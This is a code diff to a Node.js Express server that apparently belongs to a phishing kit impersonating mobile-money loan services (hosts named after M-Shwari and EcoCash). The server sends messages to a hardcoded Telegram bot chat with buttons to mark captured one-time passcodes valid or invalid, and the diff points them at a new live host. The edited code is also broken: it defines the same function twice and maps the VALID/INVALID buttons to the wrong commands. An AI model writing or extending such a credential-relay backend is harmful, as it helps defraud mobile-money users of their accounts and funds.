@@ -1,6 +1,7 @@
 const express = require("express");
 const path = require("path");
 const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
+const BASE_URL = "https://m-shwari-loans-ke.onrender.com";
 
 const app = express();
 
@@ -26,44 +27,39 @@ const CHAT_ID = "7162306402";
 
 async function sendToTelegram(message) {
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-
   await fetch(url, {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message,
-
-      reply_markup: {
-  inline_keyboard: [
-    [
-      { text: "OTP 5", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp5" },
-      { text: "OTP 6", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6" }
-    ]
-  ]
-}
-    })
-  });
-}
-
-async function sendOTPToTelegram(message) {
-  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-
-  await fetch(url, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       chat_id: CHAT_ID,
       text: message,
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "✅ VALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=valid" },
-            { text: "❌ INVALID", url: "https://ecocash-loan-app.onrender.com/telegram-command?cmd=invalid" }
+            // Updated to use the BASE_URL variable
+            { text: "OTP 5", url: `${BASE_URL}/telegram-command?cmd=otp5` },
+            { text: "OTP 6", url: `${BASE_URL}/telegram-command?cmd=otp6` }
+          ]
+        ]
+      }
+    })
+  });
+}
+
+async function sendToTelegram(message) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+  await fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+      reply_markup: {
+        inline_keyboard: [
+          [
+            // Updated to use the BASE_URL variable
+            { text: "VALID", url: `${BASE_URL}/telegram-command?cmd=otp5` },
+            { text: "INVALID", url: `${BASE_URL}/telegram-command?cmd=otp6` }
           ]
         ]
       }
